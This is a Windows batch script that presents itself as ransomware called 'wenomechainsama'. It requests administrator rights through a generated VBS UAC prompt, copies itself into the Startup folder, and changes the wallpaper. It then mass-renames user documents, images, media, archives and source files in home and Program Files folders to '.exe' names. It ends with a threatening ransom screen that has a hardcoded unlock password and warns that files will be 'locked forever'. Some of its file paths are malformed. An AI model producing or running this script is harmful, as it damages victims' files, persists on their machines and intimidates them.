@echo off
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges to continue...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"="
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"

title wenomechainsama.exe

goto start

:cracked

cls

echo Sorry bud decryption wasn't made yet sry

pause

exit

:start

reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d  "c:\somewhere\something.bmp" /f
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters

xcopy "wenomechainsama.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

RENAME %userprofile%\OneDrive\Desktop\*.txt wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\OneDrive\Desktop\*.docx wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\OneDrive\Desktop\*.html wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\OneDrive\Desktop\*.WAV wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\OneDrive\Desktop\*.WMA wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\OneDrive\Desktop\*.KBS wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\OneDrive\Desktop\*.vbs wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\OneDrive\Desktop\*.rar wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\OneDrive\Desktop\*.zip wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\OneDrive\Desktop\*.java wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\OneDrive\Desktop\*.cpp wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\OneDrive\Desktop\*.png wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\OneDrive\Desktop\*.jpg wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\OneDrive\Desktop\*.mp3 wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\OneDrive\Desktop\*.mp4 wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\OneDrive\Documents\*.txt wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\OneDrive\Documents\*.docx wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\OneDrive\Documents\*.html wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\OneDrive\Documents\*.WAV wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\OneDrive\Documents\*.WMA wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\OneDrive\Documents\*.KBS wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\OneDrive\Documents\*.vbs wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\OneDrive\Documents\*.rar wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\OneDrive\Documents\*.zip wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\OneDrive\Documents\*.java wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\OneDrive\Documents\*.cpp wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\OneDrive\Documents\*.png wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\OneDrive\Documents\*.jpg wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\OneDrive\Documents\*.mp3 wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\OneDrive\Documents\*.mp4 wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\Downloads\*.txt wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\Downloads\*.docx wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\Downloads\*.html wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\Downloads\*.WAV wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\Downloads\*.WMA wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\Downloads\*.KBS wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\Downloads\*.vbs wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\Downloads\*.rar wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\Downloads\*.zip wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\Downloads\*.java wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\Downloads\*.cpp wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\Downloads\*.png wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\Downloads\*.jpg wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\Downloads\*.mp3 wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\Downloads\*.mp4 wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\Music\*.txt wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\Music\*.docx wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\Music\*.html wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\Music\*.WAV wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\Music\*.WMA wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\Music\*.KBS wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\Music\*.vbs wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\Music\*.rar wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\Music\*.zip wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\Music\*.java wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\Music\*.cpp wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\Music\*.png wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\Music\*.jpg wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\Music\*.mp3 wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\Music\*.mp4 wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\OneDrive\Pictures\*.txt wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\OneDrive\Pictures\*.docx wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\OneDrive\Pictures\*.html wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\OneDrive\Pictures\*.WAV wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\OneDrive\Pictures\*.WMA wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\OneDrive\Pictures\*.KBS wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\OneDrive\Pictures\*.vbs wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\OneDrive\Pictures\*.rar wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\OneDrive\Pictures\*.zip wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\OneDrive\Pictures\*.java wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\OneDrive\Pictures\*.cpp wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\OneDrive\Pictures\*.png wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\OneDrive\Pictures\*.jpg wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\OneDrive\Pictures\*.mp3 wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\OneDrive\Pictures\*.mp4 wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\Videos\*.txt wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\Videos\*.docx wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\Videos\*.html wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\Videos\*.WAV wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\Videos\*.WMA wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\Videos\*.KBS wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\Videos\*.vbs wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\Videos\*.rar wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\Videos\*.zip wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\Videos\*.java wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\Videos\*.cpp wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\Videos\*.png wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\Videos\*.jpg wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\Videos\*.mp3 wenomechainsama_encrypt(%RANDOM%).exe

RENAME %userprofile%\Videos\*.mp4 wenomechainsama_encrypt(%RANDOM%).exe

RENAME C:\Program Files (x86)\*.txt wenomechainsama_encrypt(%RANDOM%).exe

RENAME C:\Program Files (x86)\*.docx wenomechainsama_encrypt(%RANDOM%).exe

RENAME C:\Program Files (x86)\*.html wenomechainsama_encrypt(%RANDOM%).exe

RENAME C:\Program Files (x86)\*.WAV wenomechainsama_encrypt(%RANDOM%).exe

RENAME C:\Program Files (x86)\*.WMA wenomechainsama_encrypt(%RANDOM%).exe

RENAME C:\Program Files (x86)\*.KBS wenomechainsama_encrypt(%RANDOM%).exe

RENAME C:\Program Files (x86)\*.vbs wenomechainsama_encrypt(%RANDOM%).exe

RENAME C:\Program Files (x86)\*.rar wenomechainsama_encrypt(%RANDOM%).exe

RENAME C:\Program Files (x86)\*.zip wenomechainsama_encrypt(%RANDOM%).exe

RENAME C:\Program Files (x86)\*.java wenomechainsama_encrypt(%RANDOM%).exe

RENAME C:\Program Files (x86)\*.cpp wenomechainsama_encrypt(%RANDOM%).exe

RENAME C:\Program Files (x86)\*.png wenomechainsama_encrypt(%RANDOM%).exe

RENAME C:\Program Files (x86)\*.jpg wenomechainsama_encrypt(%RANDOM%).exe

RENAME C:\Program Files (x86)\*.mp3 wenomechainsama_encrypt(%RANDOM%).exe

RENAME C:\Program Files (x86)\*.mp4 wenomechainsama_encrypt(%RANDOM%).exe

RENAME C:\C:\Program Files\*.txt wenomechainsama_encrypt(%RANDOM%).exe

RENAME C:\C:\Program Files\*.docx wenomechainsama_encrypt(%RANDOM%).exe

RENAME C:\C:\Program Files\*.html wenomechainsama_encrypt(%RANDOM%).exe

RENAME C:\C:\Program Files\*.WAV wenomechainsama_encrypt(%RANDOM%).exe

RENAME C:\C:\Program Files\*.WMA wenomechainsama_encrypt(%RANDOM%).exe

RENAME C:\C:\Program Files\*.KBS wenomechainsama_encrypt(%RANDOM%).exe

RENAME C:\C:\Program Files\*.vbs wenomechainsama_encrypt(%RANDOM%).exe

RENAME C:\C:\Program Files\*.rar wenomechainsama_encrypt(%RANDOM%).exe

RENAME C:\C:\Program Files\*.zip wenomechainsama_encrypt(%RANDOM%).exe

RENAME C:\C:\Program Files\*.java wenomechainsama_encrypt(%RANDOM%).exe

RENAME C:\C:\Program Files\*.cpp wenomechainsama_encrypt(%RANDOM%).exe

RENAME C:\C:\Program Files\*.png wenomechainsama_encrypt(%RANDOM%).exe

RENAME C:\C:\Program Files\*.jpg wenomechainsama_encrypt(%RANDOM%).exe

RENAME C:\C:\Program Files\*.mp3 wenomechainsama_encrypt(%RANDOM%).exe

RENAME C:\C:\Program Files\*.mp4 wenomechainsama_encrypt(%RANDOM%).exe

color 4f

cls

ECHO ---------------------You Have Been Encrypted With wenomechainsama!---------------------

ECHO You can get your files back only if you have the password key:

ECHO Security key is impossible to crack however if you think you are too smart you have three chances to try.

ECHO After three wrong keys the decryptor will be removed from your pc!

SET /P pass=Enter Password(3 chances left):

IF %pass%==grogumasterkey goto cracked

IF NOT %pass%==grogumasterkey goto incorrect1

:incorrect1

ECHO Incorrect password!

SET /P pass=Enter Password(2 chances left):

IF %pass%==grogumasterkey goto cracked

IF NOT %pass%==grogumasterkey goto incorrect2

PAUSE

EXIT

:incorrect2

ECHO Incorrect password!

SET /P pass=Enter Password(1 chance left):

IF %pass%==grogumasterkey goto cracked

IF NOT %pass%==grogumasterkey goto incorrect3

:incorrect3

echo your files are now locked forever

PAUSE

EXIT